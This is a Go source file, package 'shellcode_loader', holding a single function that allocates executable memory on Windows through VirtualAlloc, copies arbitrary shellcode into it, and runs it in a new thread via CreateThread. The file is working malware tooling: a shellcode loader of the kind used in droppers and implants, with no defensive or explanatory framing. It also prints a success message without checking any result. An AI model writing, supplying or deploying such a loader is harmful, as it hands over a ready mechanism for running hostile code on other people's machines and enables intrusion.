package shellcode_loader

import (
	"fmt"
	"syscall"
	"unsafe"
)

// ExecuteShellcode injects shellcode into memory and executes it
func ExecuteShellcode(shellcode []byte) {
	fmt.Println("Executing shellcode...")

	// Allocate memory for shellcode
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	virtualAlloc := kernel32.NewProc("VirtualAlloc")
	execMem, _, _ := virtualAlloc.Call(0, uintptr(len(shellcode)), 0x3000, 0x40)

	// Copy shellcode to allocated memory
	ptr := unsafe.Pointer(execMem)
	for i, b := range shellcode {
		*(*byte)(unsafe.Pointer(uintptr(ptr) + uintptr(i))) = b
	}

	// Create a new thread to execute shellcode
	createThread := kernel32.NewProc("CreateThread")
	createThread.Call(0, 0, execMem, 0, 0, 0)

	fmt.Println("Shellcode executed successfully.")
}
